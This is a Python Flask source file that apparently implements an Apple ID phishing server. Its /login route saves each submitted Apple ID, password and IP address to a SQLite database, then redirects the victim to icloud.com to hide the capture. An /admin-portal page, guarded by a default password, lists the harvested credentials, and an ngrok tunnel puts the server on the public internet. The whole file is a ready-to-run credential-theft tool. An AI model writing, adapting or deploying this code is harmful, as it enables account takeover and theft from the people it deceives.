import os
import sqlite3
import csv
from io import StringIO
from flask import Flask, render_template, request, redirect, url_for, session, make_response
from pyngrok import ngrok
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.secret_key = os.urandom(24).hex()
ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
DB_FILE = "research_data.db"

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP, user TEXT, pwd TEXT, ip TEXT)')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO logs (user, pwd, ip) VALUES (?, ?, ?)", 
                     (request.form.get('apple_id'), request.form.get('password'), request.remote_addr))
    return redirect("https://www.icloud.com")

@app.route('/admin-portal', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASS:
            session['auth'] = True
            return redirect(url_for('admin'))
    
    if not session.get('auth'):
        return 'Admin Login: <form method="POST"><input type="password" name="password"><button>Go</button></form>'
    
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        logs = conn.execute("SELECT * FROM logs ORDER BY time DESC").fetchall()
    return render_template('admin.html', logs=logs)

if __name__ == "__main__":
    init_db()
    
    # SAFE NGROK START
    print("[*] Attempting to start Ngrok...")
    try:
        # Check for token in system or env
        public_url = ngrok.connect(5000).public_url
        print(f"\n🟢 LIVE AT: {public_url}")
        print(f"🔒 ADMIN AT: {public_url}/admin-portal\n")
    except Exception as e:
        print(f"🟡 Ngrok skipped: {e}")
        print("🟢 Running LOCALLY only.")

    print("[*] Starting Flask server...")
    app.run(host='0.0.0.0', port=5000, debug=False)
